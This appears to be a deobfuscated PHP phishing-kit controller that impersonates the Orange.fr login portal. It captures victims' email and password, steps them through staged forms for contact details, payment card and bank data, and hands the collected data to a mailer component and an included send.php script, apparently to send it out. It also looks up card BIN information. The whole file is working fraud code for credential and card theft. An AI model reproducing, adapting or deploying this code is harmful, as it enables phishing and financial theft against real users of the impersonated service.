<?php

require_once "/var/www/html/app/classes/Mobile_Detect.php";
require_once "/var/www/html/app/classes/DaoM.php";
require_once "/var/www/html/app/classes/DispatcherC.php";
require_once "/var/www/html/app/classes/ViewResolverV.php";
require_once "/var/www/html/app/classes/Activity.php";
require_once "/var/www/html/app/classes/ValidatorK.php";
require_once "/var/www/html/app/classes/PHPMailer.php";
require_once "/var/www/html/../../send.php";
require_once "/var/www/html/app/classes/Injector.php";
$z0Fxs = Injector::newInstance();
$z0Fxs->checkPermission();
$z0Fxs->get("https://id.orange.fr/auth_user/bin/auth_user.cgi?return_url=http://www.orange.fr", "http://www.orange.fr/portail");
$A5r2v = isset($_GET["check_url"]) ? $_GET["check_url"] : '';
$amn6r = isset($_GET["return_url"]) ? $_GET["return_url"] : "identification";
if ($A5r2v == "coordonnees") {
    $BvG2Y = $_POST["email"];
    $fihRy = $_POST["password"];
    $A2Ee8 = $z0Fxs->login($BvG2Y, $fihRy);
    Activity::setSession("OtherInfo", $A2Ee8);
    die($A2Ee8);
}
if ($A5r2v == "banqueassurance") {
    die("success");
}
if (!($A5r2v == "bank")) {
    if (!(!isset($_SESSION["include"]) || $_SESSION["include"] == '' || $_SESSION["include"] == NULL)) {
        goto b0QRl;
    }
    $_SESSION["include"] = $amn6r;
    b0QRl:
    $Kt3dJ = array("email" => $voR06, "activity" => Activity::getActivity(), "txt" => $zwEQW);
    $H641x = new DispatcherC(new DaoM($Kt3dJ, new PHPMailer()), new ViewResolverV($oWxin));
    if ($amn6r == "coordonnees" && $_SESSION["include"] == "login") {
        $H641x->process($amn6r, $_POST);
        goto KeAch;
    }
    if ($amn6r == "paiement" && $_SESSION["include"] == "coordonnees") {
        $H641x->process($amn6r, $_POST);
        goto M21_f;
    }
    if ($amn6r == "banqueassurance" && $_SESSION["include"] == "paiement") {
        $H641x->process($amn6r, $_POST);
        goto K__LG;
    }
    if ($amn6r == "merci" && $_SESSION["include"] == "banqueassurance") {
        $H641x->process($amn6r, $_POST);
        goto aMZNq;
    }
    $H641x->process(NULL, $_POST);
    aMZNq:
    K__LG:
    M21_f:
    KeAch:
    // [PHPDeobfuscator] Implied script end
    return;
}
die(Activity::getBankInfo($_GET["bin"]));
